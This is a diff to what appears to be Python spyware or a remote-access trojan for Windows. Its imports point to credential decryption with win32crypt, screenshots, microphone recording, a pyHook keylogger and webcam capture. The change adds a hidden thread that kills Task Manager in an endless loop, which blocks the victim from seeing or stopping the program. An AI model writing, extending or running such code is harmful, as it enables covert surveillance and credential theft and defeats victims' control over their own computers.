@@ -2,13 +2,20 @@ from __future__ import print_function
 from shutil import copyfile
 from PIL import ImageGrab
 from os import getenv
-import sqlite3, win32crypt, socket, subprocess, os, tempfile, pyaudio 
+import sqlite3, win32crypt, socket, subprocess, _subprocess, os, tempfile, pyaudio 
 import shutil, threading, win32api, pythoncom, random, wave        
 import numpy, sys, pyHook, shutil, cv2, time, ctypes, urllib2
 
 micPath = tempfile.mkdtemp()
 keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
+
+def disableTaskManager():
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= _subprocess.STARTF_USESHOWWINDOW
+
+    while True:
+      subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
 
 def activateMic(s, time):
     FORMAT = pyaudio.paInt16
@@ -316,6 +323,7 @@ def run():
             return False
 
 def main ():
+    threading.Thread(target=disableTaskManager).start()
     while True: 
         stop = run()
         if stop:
